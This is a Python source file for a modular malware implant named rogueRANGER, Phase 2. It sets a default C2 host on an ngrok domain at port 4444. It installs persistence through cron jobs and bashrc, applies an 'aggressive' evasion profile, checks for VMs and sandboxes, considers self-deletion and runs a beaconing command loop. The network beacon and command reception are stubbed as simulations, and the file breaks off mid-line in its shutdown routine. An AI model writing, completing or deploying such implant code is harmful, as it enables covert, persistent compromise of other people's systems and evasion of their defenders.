#!/usr/bin/env python3
"""
rogueRANGER Modular Implant - Phase 2
Enterprise-grade, maintainable architecture with modern evasion
"""

import os
import sys
import time
import json
import logging
import hashlib
import platform
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path

# Import modular components
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from modules.evasion import EvasionEngine
    from modules.persistence import PersistenceEngine
    from modules.host_awareness import CloudAwareImplant
    MODULAR_AVAILABLE = True
except ImportError as e:
    print(f"[IMPLANT] Modular components not available: {e}")
    MODULAR_AVAILABLE = False

# Import Phase 1 components
try:
    from key_manager import KeyManager
    from vm_detector import VMSandboxDetector
    PHASE1_AVAILABLE = True
except ImportError:
    PHASE1_AVAILABLE = False

class ModularImplant:
    """
    Main modular implant integrating all Phase 2 components
    Professional, maintainable architecture
    """
    
    def __init__(self, config_path: Optional[str] = None, debug: bool = False):
        self.debug = debug
        self.system = platform.system().lower()
        self.hostname = platform.node()
        self.implant_id = self._generate_implant_id()
        
        # Setup logging
        self._setup_logging()
        
        # Load configuration
        self.config = self._load_config(config_path)
        
        # Initialize components
        self.components = {}
        self._initialize_components()
        
        # Operational state
        self.is_running = True
        self.beacon_interval = self.config.get('beacon_interval', 60)
        self.max_failures = self.config.get('max_failures', 5)
        self.failure_count = 0
        
        # Statistics
        self.stats = {
            'start_time': time.time(),
            'beacons_sent': 0,
            'commands_executed': 0,
            'errors': 0,
            'evasion_triggers': 0,
            'persistence_layers': 0
        }
    
    def _setup_logging(self):
        """Setup professional logging"""
        log_level = logging.DEBUG if self.debug else logging.INFO
        
        # Create logger
        self.logger = logging.getLogger('rogue_implant')
        self.logger.setLevel(log_level)
        
        # Remove existing handlers
        self.logger.handlers.clear()
        
        # Create console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(log_level)
        
        # Create formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        console_handler.setFormatter(formatter)
        
        # Add handler
        self.logger.addHandler(console_handler)
        
        # Optional: File logging (disabled by default for stealth)
        if self.config.get('enable_file_logging', False):
            log_file = self.config.get('log_file', '/tmp/rogue_implant.log')
            file_handler = logging.FileHandler(log_file)
            file_handler.setLevel(log_level)
            file_handler.setFormatter(formatter)
            self.logger.addHandler(file_handler)
    
    def _load_config(self, config_path: Optional[str] = None) -> Dict[str, Any]:
        """Load configuration from file or defaults"""
        default_config = {
            'implant_id': self.implant_id,
            'c2_host': 'inadvertent-homographical-method.ngrok-tree.dev',
            'c2_port': 4444,
            'beacon_interval': 60,
            'max_failures': 5,
            'evasion_profile': 'aggressive',
            'persistence_layers': ['cron_job', 'bashrc'],
            'enable_file_logging': False,
            'log_file': '/tmp/rogue_implant.log',
            'phase1_compatibility': True,
            'phase2_features': MODULAR_AVAILABLE
        }
        
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    file_config = json.load(f)
                # Merge with defaults
                default_config.update(file_config)
                self.logger.info(f"Loaded config from {config_path}")
            except Exception as e:
                self.logger.error(f"Failed to load config: {e}")
        
        return default_config
    
    def _generate_implant_id(self) -> str:
        """Generate unique implant ID"""
        system_info = f"{self.hostname}:{self.system}:{platform.release()}"
        implant_hash = hashlib.sha256(system_info.encode()).hexdigest()[:16]
        return f"{self.hostname}_{implant_hash}"
    
    def _initialize_components(self):
        """Initialize all modular components"""
        self.logger.info("Initializing modular components")
        
        # Evasion Engine
        if MODULAR_AVAILABLE:
            try:
                self.components['evasion'] = EvasionEngine(debug=self.debug)
                evasion_results = self.components['evasion'].apply_evasion_profile(
                    self.config.get('evasion_profile', 'aggressive')
                )
                self.logger.info(f"Evasion engine initialized: {len(evasion_results)} techniques applied")
            except Exception as e:
                self.logger.error(f"Failed to initialize evasion engine: {e}")
        
        # Host Awareness
        if MODULAR_AVAILABLE:
            try:
                self.components['awareness'] = CloudAwareImplant(debug=self.debug)
                self.logger.info("Host awareness initialized")
            except Exception as e:
                self.logger.error(f"Failed to initialize host awareness: {e}")
        
        # Persistence Engine
        if MODULAR_AVAILABLE:
            try:
                implant_path = os.path.abspath(sys.argv[0])
                self.components['persistence'] = PersistenceEngine(
                    implant_path=implant_path,
                    debug=self.debug
                )
                
                # Install persistence layers
                layers = self.config.get('persistence_layers', ['cron_job', 'bashrc'])
                persistence_results = self.components['persistence'].install_layered_persistence(layers)
                
                self.stats['persistence_layers'] = len(persistence_results)
                self.logger.info(f"Persistence initialized: {len(persistence_results)} layers installed")
                
                # Start guzzling in background
                self.components['persistence'].start_guzzling()
                
            except Exception as e:
                self.logger.error(f"Failed to initialize persistence: {e}")
        
        # Phase 1 Compatibility
        if PHASE1_AVAILABLE and self.config.get('phase1_compatibility', True):
            try:
                # Initialize KeyManager
                self.components['key_manager'] = KeyManager()
                self.logger.info("Phase 1 KeyManager initialized")
                
                # Initialize VM Detector
                self.components['vm_detector'] = VMSandboxDetector()
                self.logger.info("Phase 1 VM Detector initialized")
                
            except Exception as e:
                self.logger.error(f"Failed to initialize Phase 1 components: {e}")
        
        self.logger.info(f"Total components initialized: {len(self.components)}")
    
    def run_environment_check(self) -> Tuple[bool, Dict[str, Any]]:
        """Run comprehensive environment check"""
        self.logger.debug("Running environment check")
        
        check_results = {
            'timestamp': time.time(),
            'implant_id': self.implant_id,
            'system': self.system,
            'hostname': self.hostname
        }
        
        # Run host awareness check
        if 'awareness' in self.components:
            try:
                is_hostile, score, threats = self.components['awareness'].is_hostile_environment()
                behavior = self.components['awareness'].adapt_behavior(score, threats)
                
                check_results.update({
                    'hostile_environment': is_hostile,
                    'hostile_score': score,
                    'threats': threats,
                    'behavior_mode': behavior
                })
                
                if is_hostile:
                    self.stats['evasion_triggers'] += 1
                    self.logger.warning(f"Hostile environment detected (score: {score})")
                
            except Exception as e:
                self.logger.error(f"Host awareness check failed: {e}")
        
        # Run VM detection (Phase 1)
        if 'vm_detector' in self.components:
            try:
                vm_results = self.components['vm_detector'].detect_all()
                check_results['vm_detection'] = vm_results
                
                if vm_results.get('is_vm', False):
                    self.logger.warning(f"VM detected: {vm_results.get('confidence', 0)}")
            except Exception as e:
                self.logger.error(f"VM detection failed: {e}")
        
        # Check if self-deletion is recommended
        if 'awareness' in self.components:
            should_delete = self.components['awareness'].should_self_delete()
            check_results['should_self_delete'] = should_delete
            
            if should_delete:
                self.logger.critical("Self-deletion recommended due to high risk")
                # Would implement self-deletion logic here
        
        return check_results.get('hostile_environment', False), check_results
    
    def send_beacon(self, check_results: Dict[str, Any]) -> bool:
        """Send beacon to C2 server"""
        self.logger.debug("Preparing beacon")
        
        beacon_data = {
            'implant_id': self.implant_id,
            'timestamp': time.time(),
            'system': self.system,
            'hostname': self.hostname,
            'check_results': check_results,
            'stats': self.stats,
            'phase': 2,
            'components': list(self.components.keys())
        }
        
        # Add Phase 1 data if available
        if 'key_manager' in self.components:
            try:
                keys = self.components['key_manager'].get_keys()
                beacon_data['key_info'] = {
                    'has_keys': bool(keys),
                    'key_count': len(keys) if keys else 0
                }
            except:
                pass
        
        self.logger.info(f"Sending beacon (attempt {self.stats['beacons_sent'] + 1})")
        
        # TODO: Implement actual beacon sending
        # This would connect to C2 server via HTTPS or other channels
        
        # Simulate beacon for now
        time.sleep(0.5)  # Simulate network delay
        
        success = True  # Simulate success
        
        if success:
            self.stats['beacons_sent'] += 1
            self.failure_count = 0
            self.logger.info("Beacon sent successfully")
            
            # Simulate receiving commands
            commands = self._simulate_command_reception()
            if commands:
                self._execute_commands(commands)
            
            return True
        else:
            self.failure_count += 1
            self.stats['errors'] += 1
            self.logger.error(f"Beacon failed (failures: {self.failure_count})")
            
            if self.failure_count >= self.max_failures:
                self.logger.warning(f"Max failures reached ({self.failure_count})")
                # Would implement failure recovery logic here
            
            return False
    
    def _simulate_command_reception(self) -> List[Dict[str, Any]]:
        """Simulate receiving commands from C2 (for testing)"""
        # In production, this would parse actual C2 responses
        commands = []
        
        # Simulate occasional commands
        import random
        if random.random() < 0.3:  # 30% chance of command
            command_types = ['system_info', 'file_list', 'process_list', 'sleep']
            command_type = random.choice(command_types)
            
            commands.append({
                'command_id': f"cmd_{int(time.time())}",
                'type': command_type,
                'parameters': {},
                'timestamp': time.time()
            })
        
        return commands
    
    def _execute_commands(self, commands: List[Dict[str, Any]]):
        """Execute received commands"""
        self.logger.info(f"Executing {len(commands)} command(s)")
        
        for cmd in commands:
            try:
                self._execute_single_command(cmd)
                self.stats['commands_executed'] += 1
            except Exception as e:
                self.logger.error(f"Command execution failed: {e}")
                self.stats['errors'] += 1
    
    def _execute_single_command(self, command: Dict[str, Any]):
        """Execute a single command"""
        cmd_type = command.get('type', '')
        
        self.logger.debug(f"Executing command: {cmd_type}")
        
        if cmd_type == 'system_info':
            # Gather system information
            info = {
                'platform': platform.platform(),
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'memory': self._get_memory_info(),
                'disk': self._get_disk_info()
            }
            self.logger.info(f"System info: {info}")
            
        elif cmd_type == 'file_list':
            # List files in current directory
            files = os.listdir('.')
            self.logger.info(f"Files in current dir: {len(files)} items")
            
        elif cmd_type == 'process_list':
            # List running processes
            import subprocess
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            process_count = len(result.stdout.split('\n')) - 1
            self.logger.info(f"Running processes: {process_count}")
            
        elif cmd_type == 'sleep':
            # Sleep for specified time
            sleep_time = command.get('parameters', {}).get('seconds', 10)
            self.logger.info(f"Sleeping for {sleep_time} seconds")
            time.sleep(sleep_time)
            
        else:
            self.logger.warning(f"Unknown command type: {cmd_type}")
    
    def _get_memory_info(self) -> Dict[str, Any]:
        """Get memory information"""
        try:
            if self.system == 'linux':
                with open('/proc/meminfo', 'r') as f:
                    meminfo = f.read()
                
                total_kb = 0
                free_kb = 0
                
                for line in meminfo.split('\n'):
                    if 'MemTotal:' in line:
                        total_kb = int(line.split()[1])
                    elif 'MemFree:' in line:
                        free_kb = int(line.split()[1])
                
                return {
                    'total_mb': total_kb / 1024,
                    'free_mb': free_kb / 1024,
                    'used_mb': (total_kb - free_kb) / 1024
                }
        except:
            pass
        
        return {'error': 'Memory info unavailable'}
    
    def _get_disk_info(self) -> Dict[str, Any]:
        """Get disk information"""
        try:
            import shutil
            total, used, free = shutil.disk_usage("/")
            
            return {
                'total_gb': total / (1024**3),
                'used_gb': used / (1024**3),
                'free_gb': free / (1024**3),
                'percent_used': (used / total) * 100
            }
        except:
            return {'error': 'Disk info unavailable'}
    
    def run(self):
        """Main implant execution loop"""
        self.logger.info(f"rogueRANGER Modular Implant v2.0 starting")
        self.logger.info(f"Implant ID: {self.implant_id}")
        self.logger.info(f"System: {self.system} {platform.release()}")
        self.logger.info(f"Phase 2 Features: {MODULAR_AVAILABLE}")
        self.logger.info(f"Phase 1 Compatibility: {PHASE1_AVAILABLE}")
        
        # Initial environment check
        self.logger.info("Performing initial environment check")
        is_hostile, check_results = self.run_environment_check()
        
        if is_hostile:
            self.logger.warning("Initial environment check indicates hostile environment")
            # Would implement hostile environment handling
        
        # Main loop
        self.logger.info("Entering main beacon loop")
        
        while self.is_running:
            try:
                # Periodic environment check
                if 'awareness' in self.components:
                    is_hostile, check_results = self.run_environment_check()
                
                # Send beacon
                beacon_success = self.send_beacon(check_results)
                
                if not beacon_success:
                    self.logger.warning("Beacon failed, adjusting behavior")
                    # Would implement failure recovery
                
                # Sleep until next beacon
                self.logger.debug(f"Sleeping for {self.beacon_interval} seconds")
                time.sleep(self.beacon_interval)
                
            except KeyboardInterrupt:
                self.logger.info("Interrupted by user")
                self.is_running = False
                
            except Exception as e:
                self.logger.error(f"Error in main loop: {e}")
                self.stats['errors'] += 1
                
                # Exponential backoff on errors
                backoff_time = min(300, 2 ** self.stats['errors'])  # Max 5 minutes
                self.logger.info(f"Backing off for {backoff_time} seconds")
                time.sleep(backoff_time)
        
        # Cleanup
        self.shutdown()
    
    def shutdown(self):
        """Graceful shutdown"""
        self.logger.info("Shutting down implant")
        
        # Generate final statistics
        runtime = time.time() - self.stats['start_time']
        self.stats['runtime_seconds'] = runtime
        self.stats['beacons_per_hour'] = (self.stats['beacons_sent'] / runtime) * 3600 if runtime > 0 else 0
        
        self.logger.info(f"Final statistics:")
        self.logger.info(f"  Runtime: {runtime:.1f} seconds")
        self.logger.info(f"  Beacons sent: {self.stats['beacons_s